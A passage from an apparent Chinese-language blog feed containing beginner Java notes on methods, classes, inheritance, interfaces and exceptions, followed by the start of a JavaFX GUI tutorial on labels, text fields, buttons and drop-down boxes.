class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        int i = 1;<br>        do &#123;<br>            if(i &gt;= 5) &#123;break;&#125;<br>            ++i;<br>            System.out.println(&quot;i = &quot; + i);<br>        &#125;while(true);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 定义<br>public 数据类型 &lt;方法名&gt;()<br>public static 数据类型 &lt;方法名&gt;()<br>public static void &lt;方法名&gt;()<br>public static [数据类型] &lt;方法名&gt;(int &lt;变量名&gt;)<br>&#123;<br>return &lt;数据&gt;;<br>&#125;<br><br># 调用<br>&lt;方法名&gt;();<br>[数据类型] &lt;变量名&gt; = &lt;方法名&gt;();<br>int q = test();<br><br>方法重载：在同一个类中，方法名相同且参数列表不同<br></code></pre></td></tr></table></figure><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 定义<br>public class Test<br>&#123;<br>&#125;<br><br># 调用<br>package &lt;包名&gt;<br>Test test = new Test();<br><br># 访问本类中的成员变量<br>this.test<br></code></pre></td></tr></table></figure><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>抽象类：<code>类中有抽象方法</code> (必须定义成抽象类)</p><p>抽象方法：<code>没有方法体</code> 的方法</p><p><code>Test.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        A z = new B();<br>        z.q();<br>        z.qq();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>A.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public abstract class A<br>&#123;<br>    public abstract void q();<br>    public void qq()<br>    &#123;<br>        System.out.println(&quot;test&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>B.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class B extends A<br>&#123;<br>    // 重写抽象类<br>    public void q()<br>    &#123;<br>        System.out.println(&quot;qqq&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 子类继承父类<br>public class &lt;子类名&gt; extends &lt;父类名&gt;&#123;&#125;<br>public class Test2 extends Test1&#123;&#125;<br><br># 访问父类的成员变量<br>super.test<br></code></pre></td></tr></table></figure><h1 id="修饰"><a href="#修饰" class="headerlink" title="修饰"></a>修饰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public：可以被所有其他类所访问（不管同不同包都可以访问）<br>private：只能被自己访问和修改<br>protected：自身、子类及同一个包中类可以访问<br>default：同一包中的类可以访问，声明时没有加修饰符，认为是friendly。<br></code></pre></td></tr></table></figure><h2 id="public"><a href="#public" class="headerlink" title="public"></a>public</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public float weight;<br></code></pre></td></tr></table></figure><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private int test;<br><br>public void getTest(int q);<br>&#123;<br>test<br>&#125;<br>public void setTest(int q);<br>&#123;<br>test<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p><code>Q.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">interface &lt;接口名&gt;<br><br>public interface Q<br>&#123;<br>public abstract void qq();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>W.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class W implements Q<br>&#123;<br>public void qq()<br>&#123;<br>System.out.println(&quot;Test&quot;);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Test.java</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class Test<br>&#123;<br>    public static void main(String[] args)<br>    &#123;<br>        Q qw = new W();<br>        qw.qq();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">try<br>&#123;<br>[程序代码]<br>&#125;catch(Exception e)<br>&#123;<br>[异常处理]<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 本方法中不处理异常,由被调用处处理<br>public void test() throws Exception<br>&#123;<br>test<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内置异常"><a href="#内置异常" class="headerlink" title="内置异常"></a>内置异常</h2><table><thead><tr><th align="left"><strong>异常</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">ArithmeticException</td><td align="left">当出现异常的运算条件时，抛出此异常。例如，一个整数”除以零”时，抛出此类的一个实例。</td></tr><tr><td align="left">ArrayIndexOutOfBoundsException</td><td align="left">用非法索引访问数组时抛出的异常。如果索引为负或大于等于数组大小，则该索引为非法索引。</td></tr><tr><td align="left">ArrayStoreException</td><td align="left">试图将错误类型的对象存储到一个对象数组时抛出的异常。</td></tr><tr><td align="left">ClassCastException</td><td align="left">当试图将对象强制转换为不是实例的子类时，抛出该异常。</td></tr><tr><td align="left">IllegalArgumentException</td><td align="left">抛出的异常表明向方法传递了一个不合法或不正确的参数。</td></tr><tr><td align="left">IllegalMonitorStateException</td><td align="left">抛出的异常表明某一线程已经试图等待对象的监视器，或者试图通知其他正在等待对象的监视器而本身没有指定监视器的线程。</td></tr><tr><td align="left">IllegalStateException</td><td align="left">在非法或不适当的时间调用方法时产生的信号。换句话说，即 Java 环境或 Java 应用程序没有处于请求操作所要求的适当状态下。</td></tr><tr><td align="left">IllegalThreadStateException</td><td align="left">线程没有处于请求操作所要求的适当状态时抛出的异常。</td></tr><tr><td align="left">IndexOutOfBoundsException</td><td align="left">指示某排序索引（例如对数组、字符串或向量的排序）超出范围时抛出。</td></tr><tr><td align="left">NegativeArraySizeException</td><td align="left">如果应用程序试图创建大小为负的数组，则抛出该异常。</td></tr><tr><td align="left">NullPointerException</td><td align="left">当应用程序试图在需要对象的地方使用 <code>null</code> 时，抛出该异常</td></tr><tr><td align="left">NumberFormatException</td><td align="left">当应用程序试图将字符串转换成一种数值类型，但该字符串不能转换为适当格式时，抛出该异常。</td></tr><tr><td align="left">SecurityException</td><td align="left">由安全管理器抛出的异常，指示存在安全侵犯。</td></tr><tr><td align="left">StringIndexOutOfBoundsException</td><td align="left">此异常由 <code>String</code> 方法抛出，指示索引或者为负，或者超出字符串的大小。</td></tr><tr><td align="left">UnsupportedOperationException</td><td align="left">当不支持请求的操作时，抛出该异常。</td></tr></tbody></table><h2 id="查性异常"><a href="#查性异常" class="headerlink" title="查性异常"></a>查性异常</h2><table><thead><tr><th align="left"><strong>异常</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">ClassNotFoundException</td><td align="left">应用程序试图加载类时，找不到相应的类，抛出该异常。</td></tr><tr><td align="left">CloneNotSupportedException</td><td align="left">当调用 <code>Object</code> 类中的 <code>clone</code> 方法克隆对象，但该对象的类无法实现 <code>Cloneable</code> 接口时，抛出该异常。</td></tr><tr><td align="left">IllegalAccessException</td><td align="left">拒绝访问一个类的时候，抛出该异常。</td></tr><tr><td align="left">InstantiationException</td><td align="left">当试图使用 <code>Class</code> 类中的 <code>newInstance</code> 方法创建一个类的实例，而指定的类对象因为是一个接口或是一个抽象类而无法实例化时，抛出该异常。</td></tr><tr><td align="left">InterruptedException</td><td align="left">一个线程被另一个线程中断，抛出该异常。</td></tr><tr><td align="left">NoSuchFieldException</td><td align="left">请求的变量不存在</td></tr><tr><td align="left">NoSuchMethodException</td><td align="left">请求的方法不存在</td></tr></tbody></table><h2 id="异常方法"><a href="#异常方法" class="headerlink" title="异常方法"></a>异常方法</h2><table><thead><tr><th align="left"><strong>序号</strong></th><th align="left"><strong>方法及说明</strong></th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public String getMessage()</strong> 返回关于发生的异常的详细信息。这个消息在Throwable 类的构造函数中初始化了。</td></tr><tr><td align="left">2</td><td align="left"><strong>public Throwable getCause()</strong> 返回一个 Throwable 对象代表异常原因。</td></tr><tr><td align="left">3</td><td align="left"><strong>public String toString()</strong> 返回此 Throwable 的简短描述。</td></tr><tr><td align="left">4</td><td align="left"><strong>public void printStackTrace()</strong> 将此 Throwable 及其回溯打印到标准错误流。。</td></tr><tr><td align="left">5</td><td align="left"><strong>public StackTraceElement [] getStackTrace()</strong> 返回一个包含堆栈层次的数组。下标为0的元素代表栈顶，最后一个元素代表方法调用堆栈的栈底。</td></tr><tr><td align="left">6</td><td align="left"><strong>public Throwable fillInStackTrace()</strong> 用当前的调用栈层次填充Throwable 对象栈层次，添加到栈层次任何先前信息中。</td></tr></tbody></table><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.runoob.com/java/java-tutorial.html">https://www.runoob.com/java/java-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javafx</title>
      <link href="/2022/05/03/%E8%AF%AD%E8%A8%80/Java/GUI%E6%A1%86%E6%9E%B6/javafx/"/>
      <url>/2022/05/03/%E8%AF%AD%E8%A8%80/Java/GUI%E6%A1%86%E6%9E%B6/javafx/</url>
      
        <content type="html"><![CDATA[<h1 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GuiDemo.setTitle(&quot;test DEMO  by：test &quot;);// 设置title<br><br>// 宽度<br>GuiDemo.setMaxWidth(1100);// 最大宽度<br>GuiDemo.setMinWidth(800);// 最小高度<br><br>// 高度<br>GuiDemo.setMaxHeight(1100);  // 最大高度<br>GuiDemo.setMinHeight(800);// 最小高度<br><br>import javafx.scene.image.Image;<br>GuiDemo.getIcons().add(new Image(&quot;1.png&quot;));// 设置ico图标<br></code></pre></td></tr></table></figure><h1 id="空白面板"><a href="#空白面板" class="headerlink" title="空白面板"></a>空白面板</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.application.Application;// 导入 JavaFX 应用程序类<br>import javafx.scene.Scene;// 导入 JavaFX 场景类<br>import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.stage.Stage;// 导入 JavaFX 舞台类<br><br>public class Test extends Application &#123;// 创建名为 Test 的类并继承 Application 类<br>    public void start(Stage GuiDemo) &#123;// 重写 Application 类的 start 方法，并传入一个 Stage 对象作为参数<br><br>        GuiDemo.setTitle(&quot;test DEMO  by：test &quot;);// 设置舞台标题<br>        GuiDemo.setMinWidth(1100);// 设置舞台最小宽度<br>        GuiDemo.setMinHeight(800);// 设置舞台最小高度<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>        AnchorPane anchorPane = new AnchorPane();<br>        anchorPane.getChildren().addAll();// // 向 AnchorPane 中添加控件（此处为空）<br>        // 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>        Scene scene = new Scene(anchorPane, 600, 700);<br>        // 将场景设置为 GuiDemo 舞台的场景<br>        GuiDemo.setScene(scene);<br>        GuiDemo.show();// 显示舞台，使用户界面可见<br>    &#125;<br><br>    public static void main(String args[]) &#123;// 主程序入口点<br>        launch(args);// 启动 JavaFX 应用程序<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文本显示"><a href="#文本显示" class="headerlink" title="文本显示"></a>文本显示</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.Label;// 导入 JavaFX 标签控件类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 添加URL文字提示<br>Label l = new Label(&quot;文本测试&quot;);// 设置一个lable，用来显示提示文字<br>l.setLayoutX(5);// 设置lable的横坐标<br>l.setLayoutY(10);// 设置lable的纵坐标<br>l.setPrefWidth(70);// 设置lable的宽度<br>l.setPrefHeight(20);// 设置lable的高度<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>AnchorPane anchorPane = new AnchorPane();<br>// 向 AnchorPane 中添加控件（l）<br>anchorPane.getChildren().addAll(l);<br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(anchorPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="输入文本框"><a href="#输入文本框" class="headerlink" title="输入文本框"></a>输入文本框</h1><h2 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.TextArea;// 导入 JavaFX 文本区域控件类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//添加URL文本框<br>TextArea textArea = new TextArea();// 添加一个文本框<br>textArea.setLayoutX(75);// 设置文本框的横坐标<br>textArea.setLayoutY(5);// 设置文本框的纵坐标<br>textArea.setPrefWidth(220);// 设置文本框的宽度<br>textArea.setPrefHeight(20);// 设置文本框的高度<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>AnchorPane anchorPane = new AnchorPane();<br>// 向 AnchorPane 中添加控件（textArea）<br>anchorPane.getChildren().addAll(textArea);<br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(anchorPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h2 id="URL文本框"><a href="#URL文本框" class="headerlink" title="URL文本框"></a>URL文本框</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.TextField;// 导入 JavaFX 的 TextField 类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建文本框用于输入URL<br>TextField urlInput = new TextField();<br>// 设置 &quot;urlInput&quot; 文本框的提示文本，当文本框为空时显示<br>urlInput.setPromptText(&quot;输入URL&quot;);<br>urlInput.setLayoutX(75);// 设置文本框的横坐标<br>urlInput.setLayoutY(5);// 设置文本框的纵坐标<br>urlInput.setMinWidth(600);// 设置文本框最小宽度<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>AnchorPane anchorPane = new AnchorPane();<br>anchorPane.getChildren().addAll(urlInput);// 向 AnchorPane 中添加控件<br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(anchorPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>GuiDemo.show();// 显示舞台，使用户界面可见<br></code></pre></td></tr></table></figure><h1 id="输出文本框"><a href="#输出文本框" class="headerlink" title="输出文本框"></a>输出文本框</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.TextArea;// 导入 JavaFX 文本区域控件类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 输出文本框<br>TextArea textArea1 = new TextArea();// 添加一个文本框<br>textArea1.setLayoutX(5);// 设置文本框的横坐标<br>textArea1.setLayoutY(100);// 设置文本框的纵坐标<br>textArea1.setPrefWidth(300);// 设置文本框的宽度<br>textArea1.setPrefHeight(500);// 设置文本框的高度<br>textArea1.setWrapText(true);//设置文本框里的文字自动换行<br>        textArea1.setText(&quot;文本框内容1\n&quot; +<br>                &quot;文本框内容2\n&quot; +<br>                &quot;文本框内容3\n&quot;);<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>AnchorPane anchorPane = new AnchorPane();<br>// 向 AnchorPane 中添加控件（textArea）<br>anchorPane.getChildren().addAll(textArea1);<br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(anchorPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.Button;// 导入 JavaFX 按钮控件类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//添加确定按钮<br>Button button = new Button(&quot;测试&quot;);// 添加一个按钮<br>button.setLayoutX(405);// 设置按钮的横坐标<br>button.setLayoutY(10);// 设置按钮的纵坐标<br>button.setPrefHeight(20);// 设置按钮的高度<br>button.setPrefWidth(50);// 设置按钮的宽度<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>AnchorPane anchorPane = new AnchorPane();<br>// 向 AnchorPane 中添加控件（button）<br>anchorPane.getChildren().addAll(button);<br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(anchorPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="下拉选项"><a href="#下拉选项" class="headerlink" title="下拉选项"></a>下拉选项</h1><h2 id="单选（高亮）"><a href="#单选（高亮）" class="headerlink" title="单选（高亮）"></a>单选（高亮）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.ComboBox;  // 导入 JavaFX 组合框控件类<br>import javafx.collections.FXCollections;// 导入 JavaFX 集合工具类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//添加下拉按钮<br>String strings[] = &#123;&quot;选项1&quot;, &quot;选项2&quot;, &quot;选项3&quot;&#125;;  // 创建一个字符串数组<br>ComboBox&lt;String&gt; comboBox = new ComboBox&lt;&gt;(FXCollections.observableArrayList(strings));  // 创建一个 ComboBox 控件<br><br>comboBox.setLayoutX(315);      // 设置 ComboBox 的横坐标<br>comboBox.setLayoutY(10);       // 设置 ComboBox 的纵坐标<br>comboBox.setPrefHeight(20);    // 设置 ComboBox 的高度<br>comboBox.setPrefWidth(70);     // 设置 ComboBox 的宽度<br><br>AnchorPane anchorPane = new AnchorPane();  // 创建一个 AnchorPane 对象<br>anchorPane.getChildren().addAll(comboBox);  // 向 AnchorPane 中添加 ComboBox 控件<br>Scene scene = new Scene(anchorPane, 600, 700);  // 创建一个场景对象，将 AnchorPane 添加到场景中，指定场景的宽度和高度<br>GuiDemo.setScene(scene);  // 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.show();  // 显示舞台，使用户界面可见<br><br></code></pre></td></tr></table></figure><h2 id="单选（-white-check-mark-）"><a href="#单选（-white-check-mark-）" class="headerlink" title="单选（:white_check_mark:）"></a>单选（:white_check_mark:）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.AnchorPane;// 导入 JavaFX 锚点布局类<br>import javafx.scene.control.ChoiceBox;// 导入 JavaFX 下拉框控件类<br>import javafx.collections.FXCollections;// 导入 JavaFX 集合工具类<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//添加下拉按钮<br>String strings[] = &#123;&quot;选项1&quot;, &quot;选项2&quot;, &quot;选项3&quot;&#125;;  // 创建一个字符串数组<br>ChoiceBox choiceBox = new ChoiceBox(FXCollections.observableArrayList(strings));// 添加下拉列表<br>choiceBox.setLayoutX(315);// 设置下拉列表的横坐标<br>choiceBox.setLayoutY(10);// 设置下拉列表的纵坐标<br>choiceBox.setPrefHeight(20);// 设置下拉列表的高度<br>choiceBox.setPrefWidth(70);// 设置下拉列表的宽度<br><br>// 创建一个 AnchorPane 对象，用于放置控件<br>AnchorPane anchorPane = new AnchorPane();<br>// 向 AnchorPane 中添加控件（choiceBox）<br>anchorPane.getChildren().addAll(choiceBox);<br>// 创建一个场景对象，并将 AnchorPane 添加到场景中，同时指定场景的宽度和高度<br>Scene scene = new Scene(anchorPane, 600, 700);<br>// 将场景设置为 GuiDemo 舞台的场景<br>GuiDemo.setScene(scene);<br>// 显示舞台，使用户界面可见<br>GuiDemo.show();<br></code></pre></td></tr></table></figure><h1 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javafx.scene.layout.BorderPane;// 导入 JavaFX 边界布局容器类<br>import javafx.scene.control.Menu;// 导入 JavaFX 菜单（Menu）类<br>import javafx.scene.control.MenuBar;// 导入 JavaFX 菜单栏（MenuBar）类<br>import 